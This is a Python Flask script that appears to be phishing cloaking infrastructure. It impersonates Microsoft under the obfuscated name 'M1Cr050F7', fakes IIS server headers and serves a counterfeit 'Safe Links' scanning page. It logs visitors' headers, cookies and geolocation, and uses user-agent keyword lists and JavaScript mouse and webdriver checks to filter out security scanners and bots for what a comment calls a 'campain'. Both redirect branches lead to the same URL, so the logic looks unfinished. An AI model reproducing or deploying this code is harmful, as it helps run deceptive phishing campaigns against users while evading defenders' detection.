import argparse
import json
import logging
import datetime
import os
import uuid
import random
import requests
import re
from functools import wraps

from flask import (
    Flask, request, session, g, redirect, make_response, jsonify,
    render_template_string
)
from werkzeug.middleware.proxy_fix import ProxyFix

###############################################################################
# SERVER SETUP
###############################################################################
app = Flask(__name__)
app.secret_key = os.urandom(32)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("access.log"),
        logging.StreamHandler()
    ]
)

os.makedirs("data", exist_ok=True)
os.makedirs("analytics", exist_ok=True)

# Redirect after visit / make sure it fits the campain
SAFE_REDIRECT_URL = "https://www.M1Cr050F7.com/en-us/security"

# MS-like server signatures
MS_SERVER_TYPES = ["M1Cr050F7-IIS/10.0", "M1Cr050F7-HTTPAPI/2.0"]
MS_POWERED_BY = ["ASP.NET", "ARR/3.0", "ASP.NET 4.8"]

ip_info_cache = {}

###############################################################################
# IP / ASN LOOKUP
###############################################################################
def get_asn_info(ip):
    """Fetch ASN data from ipinfo, with caching. 'Private' if local IP."""
    if ip in ip_info_cache:
        return ip_info_cache[ip]

    import ipaddress
    try:
        ipaddress.ip_address(ip)
        if ipaddress.ip_address(ip).is_private:
            data = {
                "asn": "Private",
                "org": "Private Network",
                "country": "Local"
            }
        else:
            r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
            if r.status_code == 200:
                raw = r.json()
                org_val = raw.get("org","Unknown")
                parts = org_val.split(" ")
                data = {
                    "asn": parts[0] if parts else "Unknown",
                    "org": " ".join(parts[1:]) if len(parts)>1 else "Unknown",
                    "country": raw.get("country","Unknown"),
                    "region": raw.get("region","Unknown"),
                    "city": raw.get("city","Unknown"),
                    "hostname": raw.get("hostname","Unknown"),
                    "loc": raw.get("loc","Unknown")
                }
            else:
                data = {"asn":"Unknown","org":"Unknown","country":"Unknown"}
    except:
        data = {"asn":"Error","org":"Error","country":"Error"}

    ip_info_cache[ip]=data
    return data

###############################################################################
# USER AGENT PARSING
###############################################################################
def parse_user_agent(ua):
    """Return dict with browser, version, OS, device from user agent."""
    result = {
        "browser": "Unknown",
        "browser_version": "Unknown",
        "os": "Unknown",
        "device": "Desktop"
    }
    if "Mobile" in ua:
        result["device"] = "Mobile"
    elif "Tablet" in ua:
        result["device"] = "Tablet"

    patterns={
        "Chrome": r"Chrome/(\d+\.\d+)",
        "Firefox": r"Firefox/(\d+\.\d+)",
        "Safari": r"Version/(\d+\.\d+).*Safari",
        "Edge": r"Edg[e]?/(\d+\.\d+)",
        "MSIE": r"MSIE (\d+\.\d+)",
        "Opera": r"Opera[/ ](\d+\.\d+)"
    }
    for b, pat in patterns.items():
        m=re.search(pat, ua)
        if m:
            result["browser"]=b
            result["browser_version"]=m.group(1)
            break

    ua_lower=ua.lower()
    if "windows" in ua_lower:
        result["os"]="Windows"
    elif "mac os x" in ua_lower:
        result["os"]="macOS"
    elif "linux" in ua_lower:
        if "android" in ua_lower:
            result["os"]="Android"
        else:
            result["os"]="Linux"
    elif "iphone" in ua_lower:
        result["os"]="iOS"

    return result

###############################################################################
# GATHER CLIENT INFO
###############################################################################
def get_client_info():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip=ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent","Unknown")
    asn = get_asn_info(ip)
    info={
        "ip_address": ip,
        "user_agent": ua,
        "asn": asn.get("asn","Unknown"),
        "org": asn.get("org","Unknown"),
        "country": asn.get("country","Unknown"),
        "region": asn.get("region","Unknown"),
        "city": asn.get("city","Unknown"),
        "hostname": asn.get("hostname","Unknown"),
        "loc": asn.get("loc","Unknown"),
        "timestamp": datetime.datetime.now().isoformat(),
        "headers": dict(request.headers),
        "cookies": dict(request.cookies),
        "path": request.path,
        "method": request.method,
        "args": dict(request.args),
        "referrer": request.referrer
    }
    info.update(parse_user_agent(ua))
    return info

###############################################################################
# ANALYTICS
###############################################################################
def update_analytics(info):
    """Daily stats in analytics/daily-YYYY-MM-DD.json"""
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    fname = f"analytics/daily-{today}.json"
    analytics = {
        "total_visits":0,
        "bots":0,
        "humans":0,
        "browsers":{},
        "os":{},
        "countries":{},
        "asns":{},
        "paths":{},
        "bot_types":{},
        "hourly": {str(h):0 for h in range(24)}
    }
    if os.path.exists(fname):
        try:
            with open(fname,"r") as f:
                analytics=json.load(f)
        except:
            pass

    analytics["total_visits"]+=1
    if info.get("is_bot",False):
        analytics["bots"]+=1
        bt=info.get("bot_kind","Unknown")
        analytics["bot_types"][bt]=analytics["bot_types"].get(bt,0)+1
    else:
        analytics["humans"]+=1

    br=info.get("browser","Unknown")
    analytics["browsers"][br]=analytics["browsers"].get(br,0)+1
    os_=info.get("os","Unknown")
    analytics["os"][os_]=analytics["os"].get(os_,0)+1
    c=info.get("country","Unknown")
    analytics["countries"][c]=analytics["countries"].get(c,0)+1
    a=info.get("asn","Unknown")
    analytics["asns"][a]=analytics["asns"].get(a,0)+1
    p=info.get("path","/")
    analytics["paths"][p]=analytics["paths"].get(p,0)+1

    h=datetime.datetime.now().hour
    analytics["hourly"][str(h)]=analytics["hourly"].get(str(h),0)+1

    with open(fname,"w") as f:
        json.dump(analytics,f,indent=2)

###############################################################################
# LOG VISIT
###############################################################################
def log_visit(info,session_id,is_bot=False,bot_kind="Unknown"):
    role="BOT" if is_bot else "HUMAN"
    msg=f"{role}: SID={session_id}, IP={info['ip_address']}, ORG={info['org']}, Country={info['country']}, "
    msg+=f"UA={info['browser']} {info['browser_version']} on {info['os']}"
    if is_bot:
        msg+=f", TYPE={bot_kind}"
        logging.warning(msg)
    else:
        logging.info(msg)

    fname=f"data/{session_id}-{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.json"
    info["session_id"]=session_id
    info["is_bot"]=is_bot
    info["bot_kind"]=bot_kind
    with open(fname,"w") as f:
        json.dump(info,f,indent=2)

    update_analytics(info)

###############################################################################
# SERVER HEADERS
###############################################################################
def ms_headers():
    return {
        "Server": random.choice(MS_SERVER_TYPES),
        "X-Powered-By": random.choice(MS_POWERED_BY),
        "X-AspNet-Version": "4.0.30319",
        "X-MS-InvokeApp": "1; RequireReadOnly",
        "X-Content-Type-Options":"nosniff",
        "X-Frame-Options":"SAMEORIGIN",
        "X-XSS-Protection":"1; mode=block",
        "Strict-Transport-Security":"max-age=31536000; includeSubDomains"
    }

###############################################################################
# BOT DECORATOR
###############################################################################
def detect_bots(func):
    @wraps(func)
    def wrapper(*args,**kwargs):
        session_id = request.cookies.get("csession", str(uuid.uuid4()))
        client_info = get_client_info()

        # Basic UA check
        user_agent = client_info["user_agent"].lower()
        suspicious_tokens = [
    "bot",
    "crawler",
    "spider",
    "headless",
    "phantom",
    "selenium",
    "webdriver",
    "python-requests",
    "httpclient",
    "java",
    "curl",
    "wget",
    "scrapy",
    "go-http-client",
    "libwww-perl",
    "lwp",
    "http.request",
    "fetch",
    "aiohttp",
    "okhttp",
    "powershell",
    "node-fetch",
    "perl",
    "ruby",
    "mechanize",
    "http.rb",
    "axios",
    "cfnetwork",
    "urlgrabber",
    "pycurl",
    "masscan",
    "nmap",
    "httpx",
    "bench",
    "scan"
]
        is_bot=False
        bot_kind="UA"
        for t in suspicious_tokens:
            if t in user_agent:
                is_bot=True
                bot_kind=f"UserAgent:{t.capitalize()}"
                break

        # Merge advanced metrics if we have them
        adv=session.get("adv_metrics")
        if adv:
            client_info["advanced_metrics"]=adv
            # { "windowSize":[w,h], "screenSize":[sw,sh], "mouseMoves": int, "webdriver": bool }

            # If webdriver => definitely suspicious
            if adv.get("webdriver"):
                is_bot=True
                bot_kind="JS:webdriver"
            # If no mouse movement => suspicious
            if adv.get("mouseMoves",0)<1:
                is_bot=True
                bot_kind="JS:noMouse"
        else:
            # No advanced metrics => we haven't scanned yet?
            pass

        # Log
        log_visit(client_info, session_id, is_bot, bot_kind)

        original_result = func(*args,**kwargs)

        # convert route's return => Response
        if hasattr(original_result,"set_cookie") and hasattr(original_result,"headers"):
            response=original_result
        elif isinstance(original_result,tuple):
            length=len(original_result)
            if length==3:
                body,status_code,custom_headers=original_result
            elif length==2:
                body,status_code=original_result
                custom_headers={}
            else:
                body=original_result[0]
                status_code=200
                custom_headers={}
            response=make_response(body, status_code)
            for k,v in custom_headers.items():
                response.headers[k]=v
        else:
            response=make_response(original_result,200)

        response.set_cookie("csession", session_id, max_age=3600)
        for k,v in ms_headers().items():
            response.headers[k]=v

        return response
    return wrapper


def render_scan_page():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>M1Cr050F7 Link Protection</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .container {
      background: white;
      padding: 40px 30px;
      border-radius: 6px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 420px;
      width: 90%;
    }
    .logo {
      width: 160px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 22px;
      margin-bottom: 10px;
      color: #262626;
    }
    p {
      font-size: 15px;
      color: #555;
    }
    .spinner {
      margin: 30px auto 10px;
      width: 40px;
      height: 40px;
      border: 4px solid #c8c8c8;
      border-top: 4px solid #0078d4;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://logincdn.msauth.net/16.000.30820.2/images/M1Cr050F7_logo_138.png" alt="M1Cr050F7">
    <h1>Verifying your link...</h1>
    <p>This link is being scanned to ensure it is safe. Please wait.</p>
    <div class="spinner"></div>
    <div class="footer">M1Cr050F7 Safe Links</div>
  </div>

  <script>
    const adv = {
      windowSize:[window.innerWidth, window.innerHeight],
      screenSize:[screen.width, screen.height],
      webdriver:(navigator.webdriver === true),
      mouseMoves: 0
    };
    document.addEventListener('mousemove', () => adv.mouseMoves++);
    function sendData() {
      fetch('/api/v2/metrics/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(adv)
      })
      .then(() => {
        window.location = '/evergreen-assets/safelinks/1/atp-safelinks.html';
      })
      .catch(() => {
        document.body.innerHTML = '<h1>Error</h1>';
      });
    }
    setTimeout(sendData, 3000);
  </script>
</body>
</html>
"""


###############################################################################
# Collect Advanced Metrics
###############################################################################
@app.route("/api/v2/metrics/collect", methods=["POST"])
def collect_metrics():
    data = request.json or {}
    # store them in session
    session["adv_metrics"] = data
    return jsonify({"status":"ok"})




###############################################################################
# The "Scanning" Page
###############################################################################
@app.route("/api/v2/metrics/usr")
@app.route("/scanning_page")
def scan_page():
    return render_scan_page()


###############################################################################
# Catch-all => we either show scanning page or block/redirect
###############################################################################
@app.route("/", defaults={"uri": ""})
@app.route("/<path:uri>")
@detect_bots
def ms_catch_all(uri):
    """
    If we have no advanced metrics => show scanning page
    else => if suspicious => block, else => redirect
    But the suspicious check is done inside the decorator, we just finalize logic.
    We'll re-check if advanced metrics are missing => show scanning?
    """
    adv=session.get("adv_metrics")
    if not adv:
        # We haven't scanned yet => show scanning
        return redirect("/api/v2/metrics/usr", code=302)

    suspicious=False

    # known bots user-agent
    ua = request.headers.get("User-Agent","").lower()
    for t in [
    "bot",
    "crawler",
    "spider",
    "headless",
    "phantom",
    "selenium",
    "webdriver",
    "python-requests",
    "httpclient",
    "java",
    "curl",
    "wget",
    "scrapy",
    "go-http-client",
    "libwww-perl",
    "lwp",
    "http.request",
    "fetch",
    "aiohttp",
    "okhttp",
    "powershell",
    "node-fetch",
    "perl",
    "ruby",
    "mechanize",
    "http.rb",
    "axios",
    "cfnetwork",
    "urlgrabber",
    "pycurl",
    "masscan",
    "nmap",
    "httpx",
    "bench",
    "scan"]:

        if t in ua:
            suspicious=True
            break

        if adv.get("webdriver"):
            suspicious = True
        if adv.get("mouseMoves", 0) < 1:
            suspicious = True

        if suspicious:
            return redirect(SAFE_REDIRECT_URL, 302) # or redirect somewhere else
        else:
            return redirect(SAFE_REDIRECT_URL, 302)

def main():
    parser=argparse.ArgumentParser(description="Any URL => scanning => advanced metrics => block or redirect.")
    parser.add_argument("--port", type=int, default=5000)
    args=parser.parse_args()

    app.run(host="0.0.0.0", port=args.port, debug=False)

if __name__=="__main__":
    main()
